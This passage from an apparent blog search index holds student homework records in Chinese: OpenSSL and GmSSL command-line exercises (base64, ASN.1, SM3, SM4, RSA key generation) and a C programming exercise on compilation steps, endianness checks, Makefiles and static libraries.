-tx1 r1.bin 0000000 58 70 63 79 af 39 99 ff 18 38 0000012 [root@localhost roc-exp]# openssl rand 10 \u003e r2.bin [root@localhost roc-exp]# cat r2.bin | xxd -p e5f910cfbe23e86d242e","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:6","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"base64\rhelp\r[root@localhost roc-exp]# openssl base64 -help Usage: base64 [options] General options: -help Display this summary -list List ciphers -ciphers Alias for -list -e Encrypt -d Decrypt -p Print the iv/key -P Print the iv/key and exit -engine val Use engine, possibly a hardware device Input options: -in infile Input file -k val Passphrase -kfile infile Read passphrase from file Output options: -out outfile Output file -pass val Passphrase source -v Verbose output -a Base64 encode/decode, depending on encryption flag -base64 Same as option -a -A Used with -[base64|a] to specify base64 buffer as a single line Encryption options: -nopad Disable standard block padding -salt Use salt in the KDF (default) -nosalt Do not use salt in the KDF -debug Print debug info -bufsize val Buffer size -K val Raw key, in hex -S val Salt, in hex -iv val IV in hex -md val Use specified digest to create a key from the passphrase -iter +int Specify the iteration count and force the use of PBKDF2 Default: 10000 -pbkdf2 Use password-based key derivation function 2 (PBKDF2) Use -iter to change the iteration count from 10000 -none Don't encrypt -saltlen +int Specify the PBKDF2 salt length (in bytes) Default: 16 -z Compress or decompress encrypted data using zlib -* Any supported cipher Random state options: -rand val Load the given file(s) into the random number generator -writerand outfile Write random data to the specified file Provider options: -provider-path val Provider load path (must be before 'provider' argument if required) -provider val Provider to load (can be specified multiple times) -propquery val Property query used when fetching algorithms编码解码\r[root@localhost roc-exp]# echo cjs | openssl base64 Y2pzCg== [root@localhost roc-exp]# echo cjs | openssl base64 -e Y2pzCg== [root@localhost roc-exp]# echo Y2pzCg== | openssl base64 -d cjs [root@localhost roc-exp]# echo -ne \"\\x11\\x22\\x33\" | openssl base64 ESIz [root@localhost roc-exp]# echo ESIz | openssl base64 -d | xxd -p 112233 [root@localhost roc-exp]# echo -ne \"\\x11\\x22\\x33\\x44\" | openssl base64 ESIzRA== [root@localhost roc-exp]# echo ESIzRA== | openssl base64 -d | xxd -p 11223344文件编码解码\r[root@localhost roc-exp]# echo cjs \u003e cjs.txt [root@localhost roc-exp]# openssl base64 -in cjs.txt -out cjs.b64 [root@localhost roc-exp]# cat cjs.b64 Y2pzCg== [root@localhost roc-exp]# openssl base64 -d -in cjs.b64 -out cjs2.txt [root@localhost roc-exp]# diff cjs.txt cjs2.txt [root@localhost roc-exp]# cat cjs2.txt cjs","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:7","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"asn1parse\rhelp\r[root@localhost roc-exp]# openssl asn1parse -help Usage: asn1parse [options] General options: -help Display this summary -oid infile file of extra oid definitions I/O options: -inform parm input format - one of DER PEM B64 -in infile input file -out outfile output file (output format is always DER) -noout do not produce any output -offset +int offset into file -length +int length of section in file -strparse +int offset; a series of these can be used to 'dig' -genstr val string to generate ASN1 structure from into multiple ASN1 blob wrappings -genconf val file to generate ASN1 structure from -strictpem equivalent to '-inform pem' (obsolete) -item val item to parse and print (-inform will be ignored) Formatting options: -i indents the output -dump unknown data in hex form -dlimit +int dump the first arg bytes of unknown data in hex form密码工程中的格式\r[root@localhost roc-exp]# echo -ne \"\\x03\\x02\\x04\\x90\" \u003e bitstring.der [root@localhost roc-exp]# openssl asn1parse -inform der -i -in bitstring.der 0:d=0 hl=2 l= 2 prim: BIT STRING [root@localhost roc-exp]# openssl base64 -in bitstring.der -out bitstring.pem [root@localhost roc-exp]# ls bitstring.pem bitstring.pem [root@localhost exp1]# openssl asn1parse -inform PEM -in bitstring.pem Error reading PEM file 00503FC6867F0000:error:0480006C:PEM routines:get_name:no start line:crypto/pem/pem_lib.c:773:","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:8","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"Hash和HMAC\rhelp\r[root@localhost exp1]# openssl dgst -help Usage: dgst [options] [file...] General options: -help Display this summary -list List digests -engine val Use engine e, possibly a hardware device -engine_impl Also use engine given by -engine for digest operations -passin val Input file pass phrase source Output options: -c Print the digest with separating colons -r Print the digest in coreutils format -out outfile Output to filename rather than stdout -keyform format Key file format (ENGINE, other values ignored) -hex Print as hex dump -binary Print in binary form -xoflen +int Output length for XOF algorithms. To obtain the maximum security strength set this to 32 (or greater) for SHAKE128, and 64 (or greater) for SHAKE256 -d Print debug info -debug Print debug info Signing options: -sign val Sign digest using private key -verify val Verify a signature using public key -prverify val Verify a signature using private key -sigopt val Signature parameter in n:v form -signature infile File with signature to verify -hmac val Create hashed MAC with key -mac val Create MAC (not necessarily HMAC) -macopt val MAC algorithm parameters in n:v form or key -* Any supported digest -fips-fingerprint Compute HMAC with the key used in OpenSSL-FIPS fingerprint Random state options: -rand val Load the given file(s) into the random number generator -writerand outfile Write random data to the specified file Provider options: -provider-path val Provider load path (must be before 'provider' argument if required) -provider val Provider to load (can be specified multiple times) -propquery val Property query used when fetching algorithms Parameters: file Files to digest (optional; default is stdin) [root@localhost exp1]# openssl dgst -list Supported digests: -blake2b512 -blake2s256 -md4 -md5 -md5-sha1 -mdc2 -ripemd -ripemd160 -rmd160 -sha1 -sha224 -sha256 -sha3-224 -sha3-256 -sha3-384 -sha3-512 -sha384 -sha512 -sha512-224 -sha512-256 -shake128 -shake256 -sm3 -ssl3-md5 -ssl3-sha1 -whirlpool sm3\r[root@localhost exp1]# echo cjs | openssl dgst -sm3 SM3(stdin)= 6f5bc2fb3c22e1e235874e3e4c05d9b05aeda29a027f5211c5204de8033dc1d8 [root@localhost exp1]# echo cjs | openssl sm3 SM3(stdin)= 6f5bc2fb3c22e1e235874e3e4c05d9b05aeda29a027f5211c5204de8033dc1d8 [root@localhost exp1]# echo cjs | openssl sm3 -hex SM3(stdin)= 6f5bc2fb3c22e1e235874e3e4c05d9b05aeda29a027f5211c5204de8033dc1d8 [root@localhost exp1]# echo cjs | openssl sm3 -binary o[û\u003c\"⠵N\u003eLٰZRàM恽 [root@localhost exp1]# echo cjs | openssl sm3 -binary | xxd -p 6f5bc2fb3c22e1e235874e3e4c05d9b05aeda29a027f5211c5204de8033dc1d8文件\r[root@localhost exp1]# cat cjs.txt cjs [root@localhost exp1]# openssl sm3 cjs.txt SM3(cjs.txt)= 6f5bc2fb3c22e1e235874e3e4c05d9b05aeda29a027f5211c5204de8033dc1d8 [root@localhost exp1]# echo cjs | openssl sm3 SM3(stdin)= 6f5bc2fb3c22e1e235874e3e4c05d9b05aeda29a027f5211c5204de8033dc1d8","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:9","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"对称算法\rhelp\r[root@localhost exp1]# openssl enc -help Usage: enc [options] General options: -help Display this summary -list List ciphers -ciphers Alias for -list -e Encrypt -d Decrypt -p Print the iv/key -P Print the iv/key and exit -engine val Use engine, possibly a hardware device Input options: -in infile Input file -k val Passphrase -kfile infile Read passphrase from file Output options: -out outfile Output file -pass val Passphrase source -v Verbose output -a Base64 encode/decode, depending on encryption flag -base64 Same as option -a -A Used with -[base64|a] to specify base64 buffer as a single line Encryption options: -nopad Disable standard block padding -salt Use salt in the KDF (default) -nosalt Do not use salt in the KDF -debug Print debug info -bufsize val Buffer size -K val Raw key, in hex -S val Salt, in hex -iv val IV in hex -md val Use specified digest to create a key from the passphrase -iter +int Specify the iteration count and force the use of PBKDF2 Default: 10000 -pbkdf2 Use password-based key derivation function 2 (PBKDF2) Use -iter to change the iteration count from 10000 -none Don't encrypt -saltlen +int Specify the PBKDF2 salt length (in bytes) Default: 16 -z Compress or decompress encrypted data using zlib -* Any supported cipher Random state options: -rand val Load the given file(s) into the random number generator -writerand outfile Write random data to the specified file Provider options: -provider-path val Provider load path (must be before 'provider' argument if required) -provider val Provider to load (can be specified multiple times) -propquery val Property query used when fetching algorithms加密解密\r[root@localhost exp1]# openssl sm4-cbc -K \"2851fa25211a48023794ae9515909603\" -iv \"da80e405a4998c351b0717093cbe86ab\" -in cjs.txt -out cjs.enc [root@localhost exp1]# openssl sm4-cbc -d -K \"2851fa25211a48023794ae9515909603\" -iv \"da80e405a4998c351b0717093cbe86ab\" -in cjs.enc -out cjs3.txt [root@localhost exp1]# diff cjs.txt cjs3.txt ","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:10","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"非对称算法\rRSA\r产生密码对\r[root@localhost exp1]# openssl genpkey -algorithm RSA -out private_key.pem ..+...+......+.......+........+....+.................+++++++++++++++++++++++++++++++++++++++*...+++++++++++++++++++++++++++++++++++++++*.......+.+.....+.+........+.+..+...+.+......+..+...+....+...+...+.....+.........+....+...............+.................+.......+...........+.+......+...+..+.......+..+......+....+...+...............+..+.+..............+.........+.+......+.....++++++ .+...+...+......+...+......................+...+..+.............+..+....+++++++++++++++++++++++++++++++++++++++*........+.........+++++++++++++++++++++++++++++++++++++++*.+.....+.......+......+..+......+.........+.......+......+..+.......+......+.....+....+.....+.+...+............+............+.....+...+....+........+.......+...+...+..+.+.....+...............+......+.+.......................+.......+.........++++++ [root@localhost exp1]# cat private_key.pem -----BEGIN PRIVATE KEY----- MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/B4664/4kJ0ly 179Z9aXLp++PmYVVOhJID4PsRvfvh7v4k+N3svyq1dqqCSIsKZugLFcB0eGHQk51 l9ldxPX2cAv0AI1GtluFyFi4e+OQRVihlk9kc7g5a4kqCQqBt9nacdJy804pSJ4q ZuuECJDncpV2faPbFuUZxrWK+n41F1enqeyA0GciArkyDOM8WQSOC1i2qTO3vPCt ZW5f7jrgd1My0yTAkvGpSvlyXNR4CzuFAF3wvxWGrr07ZC+ryeAWTJZO5rxRY/qz HIVa4PA/TmQJWO2b2VdbFMmld8UWgoyIySZF/5Nl7pLLOhheNtZRRKjiBfcfgAql Ev/GbBiRAgMBAAECggEARNUVzmzBkchgNFPeHK2hYIkyDmWsgAGtPa7tg7EsvHAF wLOVJnfliC8Hm/YvjIcvjt77OOol4AV53PBqv9ltIS/Nds3OGhkyUDnZEhx96mm6 XnsZP2JdEr+XTIC2evhCtO4HfSkDVGfYqgGswkYN5H/KsEfkR1jwE0Ig/yN0X29a Fngdh6MDDdlZ3IzrKo1JfAhg1s+Q1zr4pxXtAaxVdFa9FA6JCkLrqyDzGGcqhqdU HMQxHAXGvxupEpjM4fsyrFhP9XArcpbqzsQEHatIK3xwrISx+jBmjvjU4WO3vwYD WTr1uUgMrtoqSyZ2Ck/Qw8WV61v5Q01VRUVbYVWL8wKBgQD0lmTbYfuokcw+30mr 3WY51axkwpN9Oz/sqHypDqQzIzkQaYETj8xiIjUttZFnYd6wkXwnSj00NT0ICNVV NDRRQ1++kahHAGYPMGao8/F4ATcqRA7GkpIEfx+/VWAKqwukv9qjeYs50oMzAFtz Vl+ZXbX+znYLGyiUmjv7WL+9+wKBgQDH8Wly15GP2K8/WFIjljW6XQcgq3ERDA4Y DAO5tLpmLU1sMe7bRqnjM6taYd1XX9xHsaOZU5IxUEpnDH9S/JQHFfnEX/aDufWY aJHZXr2rN+6U79HMSggx7R6OhPe1XCTEHbQQMq4kgBjsRP5zEV8T7y3hjgbDSl9F Z2s/TuF54wKBgQCjNrzk3LTHn0tRZUVPJ7XwwBKDRoiPV/tnXGObmMafzVBmEFFv EVVM4xDjiLcX6upknyDfQx4meaRZeTOK4QRMeg4pKB/ICY8RcbX/5pFrCDycur+1 aNeBoqc30av+Une5n8Ext4jdtAmS/hkIlUnEGRG6kGGbNatVxrpiFq4VAwKBgQCf Bm6lTblTnLc9/aRO86DGGkmZ/WHPejQXgi7QXGNI8005+bkNpHVo5Oar21ytquvM Bgil4adMG50huvnl6kheHmdqfhzWhmhFER63sbfPX4wd32SRRGyiMQN1vWI7WA9S AIH/xB9nno60FOgAY1eoxjpKxKiyWQvPasMNNlL1mwKBgHCa7tzK6slkM6/yhWeZ 18BKL0djusAQwNGS3d6GDu+Mik2ZDOpyNdZjQU3LWF9w9XBWBh++Ssh5be9zrpCE Nj181qRe3GKA6HkZ768tRV9WAvD1rFd3SZtjb7WR9xlZYB2bwLGXpM9R+sB6z4cF SyijGAMi35NnZwKxavuG5dK6 -----END PRIVATE KEY----- [root@localhost exp1]# openssl asn1parse -inform PEM -in private_key.pem 0:d=0 hl=4 l=1214 cons: SEQUENCE 4:d=1 hl=2 l= 1 prim: INTEGER :00 7:d=1 hl=2 l= 13 cons: SEQUENCE 9:d=2 hl=2 l= 9 prim: OBJECT :rsaEncryption 20:d=2 hl=2 l= 0 prim: NULL 22:d=1 hl=4 l=1192 prim: OCTET STRING [HEX DUMP]:308204A40201000282010100BF078EBAE3FE24274972D7BF59F5A5CBA7EF8F9985553A12480F83EC46F7EF87BBF893E377B2FCAAD5DAAA09222C299BA02C5701D1E187424E7597D95DC4F5F6700BF4008D46B65B85C858B87BE3904558A1964F6473B8396B892A090A81B7D9DA71D272F34E29489E2A66EB840890E77295767DA3DB16E519C6B58AFA7E351757A7A9EC80D0672202B9320CE33C59048E0B58B6A933B7BCF0AD656E5FEE3AE0775332D324C092F1A94AF9725CD4780B3B85005DF0BF1586AEBD3B642FABC9E0164C964EE6BC5163FAB31C855AE0F03F4E640958ED9BD9575B14C9A577C516828C88C92645FF9365EE92CB3A185E36D65144A8E205F71F800AA512FFC66C189102030100010282010044D515CE6CC191C8603453DE1CADA16089320E65AC8001AD3DAEED83B12CBC7005C0B3952677E5882F079BF62F8C872F8EDEFB38EA25E00579DCF06ABFD96D212FCD76CDCE1A19325039D9121C7DEA69BA5E7B193F625D12BF974C80B67AF842B4EE077D29035467D8AA01ACC2460DE47FCAB047E44758F0134220FF23745F6F5A16781D87A3030DD959DC8CEB2A8D497C0860D6CF90D73AF8A715ED01AC557456BD140E890A42EBAB20F318672A86A7541CC4311C05C6BF1BA91298CCE1FB32AC584FF5702B7296EACEC4041DAB482B7C70AC84B1FA30668EF8D4E163B7BF0603593AF5B9480CAEDA2A4B26760A4FD0C3C595EB5BF9434D5545455B61558B","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:11","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"参考云班课相关教学视频，在 Ubuntu或openEuler中（推荐 openEuler）中实践课程课程思维导图中GmSSL相关内容，使用Markdown记录详细记录实践过程，每完成一项git commit 一次。（5‘）\rgmssl\r[root@localhost exp1]# gmssl version GmSSL 3.1.2 Dev [root@localhost exp1]# gmssl help usage: gmssl command [options] command -help Commands: help Print this help message version Print version rand Generate random bytes sm2keygen Generate SM2 keypair sm2sign Generate SM2 signature sm2verify Verify SM2 signature sm2encrypt Encrypt with SM2 public key sm2decrypt Decrypt with SM2 private key sm3 Generate SM3 hash sm3hmac Generate SM3 HMAC tag sm3_pbkdf2 Hash password into key using PBKDF2 algoritm sm3xmss_keygen Generate SM3-XMSS keypair sm4_ecb Encrypt or decrypt with SM4 ECB sm4_cbc Encrypt or decrypt with SM4 CBC sm4_ctr Encrypt or decrypt with SM4 CTR sm4_cfb Encrypt or decrypt with SM4 CFB sm4_ofb Encrypt or decrypt with SM4 OFB sm4_ccm Encrypt or decrypt with SM4 CCM sm4_gcm Encrypt or decrypt with SM4 GCM sm4_xts Encrypt or decrypt with SM4 XTS sm4_cbc_sm3_hmac Encrypt or decrypt with SM4 CBC with SM3-HMAC sm4_ctr_sm3_hmac Encrypt or decrypt with SM4 CTR with SM3-HMAC sm4_cbc_mac Generate SM4 CBC-MAC ghash Generate GHASH zuc Encrypt or decrypt with ZUC sm9setup Generate SM9 master secret sm9keygen Generate SM9 private key sm9sign Generate SM9 signature sm9verify Verify SM9 signature sm9encrypt SM9 public key encryption sm9decrypt SM9 decryption reqgen Generate certificate signing request (CSR) reqsign Generate certificate from CSR reqparse Parse and print a CSR crlget Download the CRL of given certificate crlgen Sign a CRL with CA certificate and private key crlverify Verify a CRL with issuer's certificate crlparse Parse and print CRL certgen Generate a self-signed certificate certparse Parse and print certificates certverify Verify certificate chain certrevoke Revoke certificate and output RevokedCertificate record cmsparse Parse CMS (cryptographic message syntax) file cmsencrypt Generate CMS EnvelopedData cmsdecrypt Decrypt CMS EnvelopedData cmssign Generate CMS SignedData cmsverify Verify CMS SignedData sdfinfo Print SDF device info sdfdigest Generate SM3 hash with SDF device sdfexport Export SM2 signing public key from SDF device sdfsign Generate SM2 signature with SDF internal private key sdfencrypt SM2/SM4-CBC hybrid encryption with SDF device sdfdecrypt SM2/SM4-CBC hybrid decryption with SDF device sdftest Test vendor's SDF library and device tlcp_client TLCP client tlcp_server TLCP server tls12_client TLS 1.2 client tls12_server TLS 1.2 server tls13_client TLS 1.3 client tls13_server TLS 1.3 server run `gmssl \u003ccommand\u003e -help` to print help of the given commandsm3\rhelp\r[root@localhost exp1]# gmssl sm3 -help usage: sm3 [-hex|-bin] [-pubkey pem [-id str]] [-in file|-in_str str] [-out file] Options -hex Output hash value as hex string (by default) -bin Output hash value as binary -pubkey pem Signer's SM2 public key When `-pubkey` is specified, hash with SM2 Z value -id str SM2 Signer's ID string -id_hex hex SM2 Signer's ID in hex format `-id` and `-id_hex` should be used with `-pubkey` `-id` and `-id_hex` should not be used together If `-pubkey` is specified without `-id` or `id_hex`, the default ID string '1234567812345678' is used -in_str str To be hashed string -in file | stdin To be hashed file path `-in_str` and `-in` should not be used together If neither `-in` nor `-in_str` specified, read from stdin -out file | stdout Output file path. If not specified, output to stdout Examples gmssl sm3 -in_str abc gmssl sm3 -in_str abc -bin gmssl sm3 -in /path/to/file gmssl sm3 -pubkey sm2pubkey.pem -id alice -in /path/to/file -bin When reading from stdin, make sure the trailing newline character is removed Linux/Mac: echo -n abc | gmssl sm3 Windows: C:\\\u003e echo |set/p=\"abc\" | gmssl sm3[root@localhost gm]# echo -n \"cjs\" |gmssl sm3 f700f22f711aa32494c2791150b676ad497fc057b61c87374dbf778c7d8f70db [root@localhost gm]# echo -n \"cjs\" |gmssl sm3 -hex f700f22f711aa32494c2791150b676ad497fc057b61c87374dbf778c7d8f70db [r","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:12","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"两人一组，在 Ubuntu或openEuler中（推荐 openEuler）中使用OpenSSL命令实现带签名的数字信封协议。使用OpenSSL时Alice发送，Bob接收。Ailice，Bob在实验中要替换为自己的8位学号+姓名。 使用Markdown记录详细记录实践过程，每完成一项git commit 一次。（10分）\r","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:13","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"两人一组，在 Ubuntu或openEuler中（推荐 openEuler）中使用GmSSL命令实现带签名的数字信封协议。使用GmSSL，Bob发送，Alice接收。Ailice，Bob在实验中要替换为自己的8位学号+姓名。 使用Markdown记录详细记录实践过程，每完成一项git commit 一次。（10分）\r","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:14","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"实验记录中提交 gitee 课程项目链接，提交本次实验相关 git log运行结果\r","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:15","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"提交要求：\r提交实践过程Markdown和转化的PDF文件 代码，文档托管到gitee或github等，推荐 gitclone 记录实验过程中遇到的问题，解决过程，反思等内容，完成实验报告相关内容 ","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:16","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"C编程⼯具测试\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:0:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"hello\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:1:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"过程\r➜ p2 git:(master) ✗ gcc -E hello.c -o hello.i ➜ p2 git:(master) ✗ gcc -S hello.i -o hello.s ➜ p2 git:(master) ✗ gcc -c hello.s -o hello.o ➜ p2 git:(master) ✗ gcc hello.o -o hello ➜ p2 git:(master) ✗ ls a.out hello hello.c hello.i hello.o hello.s ➜ p2 git:(master) ✗ ./hello hello 20221415","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:1:1","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"大小端代码测试\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:2:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"编译运行\rall: gcc cebitfields.c -o cebitfields gcc cebitwise.c -o cebitwise gcc celibrary.c -o celibrary gcc cepointer.c -o cepointer gcc ceunion.c -o ceunion ➜ big-little-endian git:(master) ✗ make gcc cebitfields.c -o cebitfields gcc cebitwise.c -o cebitwise gcc celibrary.c -o celibrary gcc cepointer.c -o cepointer gcc ceunion.c -o ceunion ➜ big-little-endian git:(master) ✗ ls cebitfields cebitwise celibrary cepointer ceunion Makefile cebitfields.c cebitwise.c celibrary.c cepointer.c ceunion.c ➜ big-little-endian git:(master) ✗ ./cebitfields Little Endian (Bit-field Method) ➜ big-little-endian git:(master) ✗ ./cebitwise Little Endian (Bitwise Method) ➜ big-little-endian git:(master) ✗ ./celibrary Little Endian (Standard Library Method) ➜ big-little-endian git:(master) ✗ ./cepointer Little Endian (Pointer Method) ➜ big-little-endian git:(master) ✗ ./ceunion Little Endian (Union Method)","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:2:1","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"命令行\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:3:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"编写main.c ble.h Makefile\rmain.c\r#include \"ble.h\" #include\u003cstring.h\u003e #include \u003cstdlib.h\u003e int main(int argc, char* argv[]){ if(argc == 1){ printf(\"use -i to chose method\\n\"); printf(\"1 -\u003e fields\\n2 -\u003e wise\\n3 -\u003e library\\n4 -\u003e pointer\\n5 -\u003e union\\n\"); return 0; } int choice = 0; for(int i = 1; i \u003c argc; i++){ if(strcmp(argv[i], \"-i\") == 0){ if(i + 1 \u003e= argc){ printf(\"Parameters are missing\\n\"); return 0; } choice = atoi(argv[i + 1]); break; } } switch (choice) { case 1: check_endian_bit_field(); break; case 2: check_endian_bitwise(); break; case 3: check_endian_standard(); break; case 4: check_endian_pointer(); break; case 5: check_endian_union(); break; default: printf(\"Wrong Parameters\\n\"); } return 0; }ble.h\r#ifndef CC_BLE_H #define CC_BLE_H #include\u003cstdio.h\u003e void check_endian_bit_field(); void check_endian_bitwise(); void check_endian_standard(); void check_endian_pointer(); void check_endian_union(); #endif //CC_BLE_H Makefile\rmain: cebitfields.o cebitwise.o celibrary.o cepointer.o ceunion.o main.o gcc -o main *.o cebitfields.o: cebitfields.c ble.h gcc -c cebitfields.c cebitwise.o: cebitwise.c ble.h gcc -c cebitwise.c celibrary.o: celibrary.c ble.h gcc -c celibrary.c cepointer.o: cepointer.c ble.h gcc -c cepointer.c ceunion.o: ceunion.c ble.h gcc -c ceunion.c main.: main.c ble.h gcc -c main.c clean: rm -f *.o","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:3:1","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"编译运行\r➜ p3 git:(master) ✗ make \u0026\u0026 make clean gcc -c cebitfields.c gcc -c cebitwise.c gcc -c celibrary.c gcc -c cepointer.c gcc -c ceunion.c cc -c -o main.o main.c gcc -o main *.o rm -f *.o ➜ p3 git:(master) ✗ ./main use -i to chose method 1 -\u003e fields 2 -\u003e wise 3 -\u003e library 4 -\u003e pointer 5 -\u003e union➜ p3 git:(master) ✗ ./main -i 1 Little Endian (Bit-field Method) ➜ p3 git:(master) ✗ ./main -i 2 Little Endian (Bitwise Method) ➜ p3 git:(master) ✗ ./main -i 3 Little Endian (Standard Library Method) ➜ p3 git:(master) ✗ ./main -i 4 Little Endian (Pointer Method) ➜ p3 git:(master) ✗ ./main -i 5 Little Endian (Union Method) ➜ p3 git:(master) ✗ ./main -i Parameters are missing ➜ p3 git:(master) ✗ ./main -i 10 Wrong Parameters","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:3:2","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"静态库\r","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:4:0","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"制作静态库\rMakefile libble.a: cebitfields.o cebitwise.o celibrary.o cepointer.o ceunion.o ar rcs libble.a *.o cebitfields.o: cebitfields.c ble.h gcc -c cebitfields.c cebitwise.o: cebitwise.c ble.h gcc -c cebitwise.c celibrary.o: celibrary.c ble.h gcc -c celibrary.c cepointer.o: cepointer.c ble.h gcc -c cepointer.c ceunion.o: ceunion.c ble.h gcc -c ceunion.c clean: rm -f *.o➜ p3-1 git:(master) ✗ make \u0026\u0026 make clean gcc -c cebitfields.c gcc -c cebitwise.c gcc -c celibrary.c gcc -c cepointer.c gcc -c ceunion.c ar rcs libble.a *.o rm -f *.o ➜ p3-1 git:(master) ✗ ls ble.h cebitfields.c cebitwise.c celibrary.c cepointer.c ceunion.c libble.a main main.c Makefile","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:4:1","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"链接静态库\r➜ p3-1 git:(master) ✗ rm main ➜ p3-1 git:(master) ✗ sudo cp libble.a /usr/lib/ ➜ p3-1 git:(master) ✗ gcc -o main main.c -lble","date":"2024-10-08","objectID":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/:4:2","tags":[null],"title":"C编程⼯具测试","uri":"/posts/homework/c%E7%BC%96%E7%A8%8B%E5%85%B7%E6%B5%8B%E8%AF%95/"},{"categories":["homework"],"content":"测试运行\r➜ p3-1 git:(master) ✗ ls ble.h cebitfields.c cebitwise.c celibrary.c cepointer.c ceunion.c libble.a main main.c Makefile ➜ p3-1 git:(master) ✗ ./main -i 1 Little Endian (Bit-field Method) ➜ p3-1 git:(master) ✗ ./main -i 2 Little Endian (Bitwise Method) ➜ p3-1 git:(master) ✗ ./main -i 3 Little Endian (Standard Library Method) ➜ p3-1 git:(master) ✗ ./main -i 4 Little Endian (Pointer Method) ➜ p3-1 git:(master) ✗ ./main -i 5 Little Endian (Union Method) ➜ p3-1 git:(master) ✗ ./main -i Parameters are missing ➜ p3-1 git:(master) ✗ ./main -i 10 Wrong Parameters ➜ p3-1 git:(master) ✗ ./main use -i to chose method 1 -\u003e fields 2 -\u003e wise 3 -\u003e library 4 -\u003e pointer 5 -\u003e 